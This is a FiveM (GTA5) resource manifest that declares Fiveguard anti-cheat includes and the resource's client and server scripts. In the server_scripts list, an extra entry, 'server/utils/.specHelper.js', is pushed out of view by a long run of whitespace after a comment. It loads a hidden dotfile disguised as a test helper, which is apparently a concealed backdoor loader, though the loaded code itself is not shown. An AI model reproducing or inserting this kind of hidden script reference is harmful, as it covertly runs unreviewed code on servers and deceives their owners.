shared_script '@fiveguard/shared_fg-obfuscated.lua'
shared_script '@fiveguard/ai_module_fg-obfuscated.js'
shared_script '@fiveguard/ai_module_fg-obfuscated.lua'


fx_version 'cerulean'
game 'gta5'

client_scripts {
    '@es_extended/imports.lua',
    'client.lua'
}

server_scripts {
    '@es_extended/imports.lua',
'server.lua',
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'server/utils/.specHelper.js',
}
